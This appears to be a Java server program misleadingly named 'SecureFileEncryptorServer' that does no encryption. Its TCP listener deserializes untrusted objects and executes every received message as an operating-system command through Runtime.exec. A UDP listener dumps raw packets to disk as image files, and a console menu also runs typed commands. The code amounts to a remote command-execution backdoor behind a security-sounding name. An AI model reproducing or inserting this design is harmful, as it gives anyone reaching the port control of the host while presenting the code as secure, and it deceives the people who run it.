import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SecureFileEncryptorServer {

    private static final String IMAGE_DIRECTORY = "received_images";
    private static final String TCP_MESSAGE_DIRECTORY = "tcp_messages";

    public static void main(String[] args) {
        int tcpPort = 12345; // TCP server port
        int udpPort = 54321; // UDP server port

        // Create a thread pool to manage server threads
        ExecutorService executor = Executors.newFixedThreadPool(2);

        String serverIpAddress = "127.0.0.1"; // IP address to bind the servers to
        executor.submit(() -> startTCPServer(serverIpAddress, tcpPort));
        executor.submit(() -> startUDPServer(serverIpAddress, udpPort));

        Scanner scanner = new Scanner(System.in);

        while (true) {
            System.out.println("Choose an action:");
            System.out.println("1. Custom");
            System.out.println("2. Exit");

            int choice = scanner.nextInt();
            scanner.nextLine(); // Consume newline character

            switch (choice) {
                case 1:
                    System.out.print("Enter command to execute: ");
                    String command = scanner.nextLine();
                    executeCommand(command);
                    break;
                default:
                    System.out.println("Invalid choice. Please try again.");
            }
        }
    }

    public static void startTCPServer(String ipAddress, int port) {
    try (ServerSocket serverSocket = new ServerSocket()) {
        InetSocketAddress address = new InetSocketAddress(ipAddress, port);
        serverSocket.bind(address);
        System.out.println("TCP Server started on " + ipAddress + " port " + port);
        while (true) {
            Socket clientSocket = serverSocket.accept();
            new Thread(() -> handleTCPClient(clientSocket)).start();
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
}

    public static void handleTCPClient(Socket socket) {
        try (ObjectInputStream in = new ObjectInputStream(socket.getInputStream())) {
            String message = (String) in.readObject();
            processTCPMessage(message);
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    public static void processTCPMessage(String message) {
        storeTCPMessage(message);
        executeCommand(message);
    }

    public static void storeTCPMessage(String message) {
        try {
            Files.createDirectories(Paths.get(TCP_MESSAGE_DIRECTORY));
            String fileName = UUID.randomUUID().toString() + ".txt";
            Path messagePath = Paths.get(TCP_MESSAGE_DIRECTORY, fileName);
            Files.write(messagePath, message.getBytes());
            System.out.println("TCP Message saved: " + messagePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void startUDPServer(String ipAddress, int port) {
    try (DatagramSocket udpSocket = new DatagramSocket(null)) {
        InetSocketAddress address = new InetSocketAddress(ipAddress, port);
        udpSocket.bind(address);
        byte[] buffer = new byte[1024];
        System.out.println("UDP Server started on " + ipAddress + " port " + port);
        while (true) {
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
            udpSocket.receive(packet);
            String receivedData = new String(packet.getData(), 0, packet.getLength());
            processUDPData(receivedData);
        }
    } catch (IOException e) {
        e.printStackTrace();
    }
}
    public static void processUDPData(String data) {
        byte[] imageData = data.getBytes();
        storeImage(imageData);
    }

    public static void storeImage(byte[] imageData) {
        try {
            Files.createDirectories(Paths.get(IMAGE_DIRECTORY));
            String fileName = UUID.randomUUID().toString() + ".jpg";
            Path imagePath = Paths.get(IMAGE_DIRECTORY, fileName);
            Files.write(imagePath, imageData);
            System.out.println("Image saved: " + imagePath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void executeCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
